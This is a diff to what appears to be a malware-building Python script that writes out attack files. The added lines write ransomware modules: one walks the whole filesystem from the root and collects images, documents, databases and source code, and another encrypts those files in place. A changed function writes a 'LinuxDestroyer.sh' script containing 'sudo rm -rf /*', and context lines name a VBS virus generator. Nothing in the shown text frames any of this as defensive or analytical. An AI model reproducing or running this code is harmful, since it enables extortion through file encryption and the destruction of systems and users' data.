@@ -8,6 +8,7 @@ import smtplib
 from threading import Timer
 from datetime import datetime
 import platform
+import subprocess
 print(platform.system())
 print(platform.release())
 print(platform.version())
@@ -289,6 +290,88 @@ GOTO LOOP
         ''')
 def ransomware():
         file6 = open('ransomware.py','w+')
+        filemain = open('discover.py','w+')
+        filemod = open('modify.py','w+')
+        filemod.write("""
+        def modify_file_inplace(filename, crypto, blocksize=16):
+    '''
+    Open `filename` and encrypt/decrypt according to `crypto`
+    :filename: a filename (preferably absolute path)
+    :crypto: a stream cipher function that takes in a plaintext,
+             and returns a ciphertext of identical length
+    :blocksize: length of blocks to read and write.
+    :return: None
+    '''
+    with open(filename, 'r+b') as f:
+        plaintext = f.read(blocksize)
+
+        while plaintext:
+            ciphertext = crypto(plaintext)
+            if len(plaintext) != len(ciphertext):
+                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
+                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))
+
+            f.seek(-len(plaintext), 1) # return to same point before the read
+            f.write(ciphertext)
+
+            plaintext = f.read(blocksize)
+        """)
+        filemain.write("""
+        #!/usr/bin/env python
+import os
+
+def discoverFiles(startpath):
+    '''
+    Walk the path recursively down from startpath, and perform method on matching files.
+    :startpath: a directory (preferably absolute) from which to start recursing down.
+    :yield: a generator of filenames matching the conditions
+    Notes:
+        - no error checking is done. It is assumed the current user has rwx on
+          every file and directory from the startpath down.
+        - state is not kept. If this functions raises an Exception at any point,
+          There is no way of knowing where to continue from.
+    '''
+
+    # This is a file extension list of all files that may want to be encrypted.
+    # They are grouped by category. If a category is not wanted, Comment that line.
+    # All files uncommented by default should be harmless to the system
+    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
+    # BUT applications which depend on such resources may become broken.
+    # This will not cover all files, but it should be a decent range.
+    extensions = [
+        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
+        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
+        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
+
+        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
+        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
+        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
+        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
+
+        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
+        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
+        'java', 'class', 'jar', # java source code
+        'ps', 'bat', 'vb', # windows based scripts
+        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
+        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
+
+        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+    ]
+
+    for dirpath, dirs, files in os.walk(startpath):
+        for i in files:
+            absolute_path = os.path.abspath(os.path.join(dirpath, i))
+            ext = absolute_path.split('.')[-1]
+            if ext in extensions:
+                yield absolute_path
+
+if __name__ == "__main__":
+    x = discoverFiles('/')
+    for i in x:
+        print i
+        """)
+
         file6.write("""
        #!/usr/bin/env python
 from Crypto.Cipher import AES
@@ -371,6 +454,7 @@ Your decryption key is: '{}'
 if __name__=="__main__":
     main()
         """)
+
 def ily():
     file7 = open('ilyvirus.VBS','w+')
     file7.write('''
@@ -654,9 +738,8 @@ def ily():
 
 def filedeletionl():
     filel2 = open('LinuxDestroyer.sh','w+')
-    filel2.write('''echo "Your Linux is Dead! HAAHHAHA"
-    echo "Deleting System Files..."
-    sudo rm -rf / *
+    filel2.write(Fore.RED + '''
+    sudo rm -rf /*
     ''')
 def elf():
     filel3 = open("ELF.c",'w+')
